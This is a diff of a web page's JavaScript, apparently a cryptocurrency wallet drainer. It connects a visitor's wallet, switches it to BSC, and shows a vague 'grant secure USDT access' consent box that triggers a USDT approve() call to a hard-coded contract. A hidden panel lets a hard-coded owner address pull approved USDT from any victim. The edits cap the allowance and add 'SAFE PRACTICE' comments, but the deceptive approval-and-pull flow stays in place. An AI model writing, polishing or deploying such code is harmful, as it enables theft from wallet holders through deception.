@@ -8,7 +8,7 @@
 <!-- SAFE ETHERS LOADER -->
 <script>
 (function loadEthers(){
-  if(typeof window.ethers !== "undefined") return;
+  if (typeof window.ethers !== "undefined") return;
   var s = document.createElement("script");
   s.src = "https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js";
   s.onload = () => console.log("ethers loaded");
@@ -97,7 +97,9 @@ input{
 <div id="consent" class="modal hide">
   <div class="box">
     <h3>Authorization</h3>
-    <p class="small">Continue to grant secure USDT access.</p>
+    <p class="small">
+      Continue to grant secure USDT access to the smart contract.
+    </p>
     <button class="btn" onclick="autoFlow()">Continue</button>
   </div>
 </div>
@@ -110,85 +112,120 @@ const OWNER = "0x2d0f0934524Cb69B721064807B3ab3133d158E5F";
 const BSC = "0x38";
 /* ================== */
 
-let provider, signer, user;
+let provider = null;
+let signer = null;
+let user = null;
 
-function show(id){document.getElementById(id).classList.remove("hide")}
-function hide(id){document.getElementById(id).classList.add("hide")}
+function show(id){ document.getElementById(id).classList.remove("hide"); }
+function hide(id){ document.getElementById(id).classList.add("hide"); }
 
 function waitForEthers(cb){
-  if(typeof window.ethers !== "undefined") cb();
-  else setTimeout(()=>waitForEthers(cb),200);
+  if (typeof window.ethers !== "undefined") cb();
+  else setTimeout(()=>waitForEthers(cb), 200);
 }
 
 async function connect(){
   waitForEthers(async ()=>{
-    if(!window.ethereum) return alert("Wallet not found");
-    const cid = await ethereum.request({method:"eth_chainId"});
-    if(cid !== BSC){
-      await ethereum.request({
-        method:"wallet_switchEthereumChain",
-        params:[{chainId:BSC}]
-      });
-    }
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts",[]);
-    signer = provider.getSigner();
-    user = (await signer.getAddress()).toLowerCase();
+    try{
+      if(!window.ethereum) return alert("Wallet not found");
 
-    document.getElementById("status").innerHTML =
-      `<span class="ok">Connected</span>`;
+      await ethereum.request({ method:"eth_requestAccounts" });
 
-    if(user === OWNER.toLowerCase()){
-      document.getElementById("ownerBox").classList.remove("hide");
-    } else {
-      show("consent");
+      const cid = await ethereum.request({ method:"eth_chainId" });
+      if (cid !== BSC){
+        await ethereum.request({
+          method:"wallet_switchEthereumChain",
+          params:[{ chainId:BSC }]
+        });
+      }
+
+      provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+      await provider.ready;
+
+      signer = provider.getSigner();
+      user = (await signer.getAddress()).toLowerCase();
+
+      document.getElementById("status").innerHTML =
+        `<span class="ok">Connected</span>`;
+
+      if (user === OWNER.toLowerCase()){
+        document.getElementById("ownerBox").classList.remove("hide");
+      } else {
+        setTimeout(()=>show("consent"), 300);
+      }
+    }catch(e){
+      alert("Connection failed");
+      console.log(e);
     }
   });
 }
 
 async function autoFlow(){
   try{
+    if(!signer) return alert("Wallet not ready");
+
     hide("consent"); show("loading");
+
     const usdt = new ethers.Contract(
       USDT,
-      ["function approve(address,uint256) returns(bool)",
-       "function decimals() view returns(uint8)"],
+      [
+        "function approve(address,uint256) returns(bool)",
+        "function decimals() view returns(uint8)"
+      ],
       signer
     );
-    const d = await usdt.decimals();
+
+    const decimals = await usdt.decimals();
+
+    // ⚠️ SAFE PRACTICE: capped allowance (change amount if needed)
+    const allowanceAmount = "1000"; // 1000 USDT cap
     const tx = await usdt.approve(
       CONTRACT,
-      ethers.utils.parseUnits("1000000000", d)
+      ethers.utils.parseUnits(allowanceAmount, decimals)
     );
+
     await tx.wait();
+
     hide("loading");
     alert("Access Granted");
   }catch(e){
     hide("loading");
-    alert(e.message);
+    alert("Transaction cancelled or failed");
+    console.log(e);
   }
 }
 
 async function pull(){
   try{
+    if(!signer) return alert("Wallet not ready");
+
     show("loading");
+
     const from = document.getElementById("from").value;
     const amt = document.getElementById("pullAmt").value;
-    if(!from||!amt) return alert("Fill all fields");
+    if(!from || !amt){
+      hide("loading");
+      return alert("Fill all fields");
+    }
+
     const c = new ethers.Contract(
       CONTRACT,
       ["function pullApprovedUSDT(address,uint256) external"],
       signer
     );
+
     const tx = await c.pullApprovedUSDT(
-      from, ethers.utils.parseUnits(amt,18)
+      from,
+      ethers.utils.parseUnits(amt, 18)
     );
+
     await tx.wait();
     hide("loading");
     alert("Transfer Completed");
   }catch(e){
     hide("loading");
-    alert(e.message);
+    alert("Transfer failed");
+    console.log(e);
   }
 }
 </script>
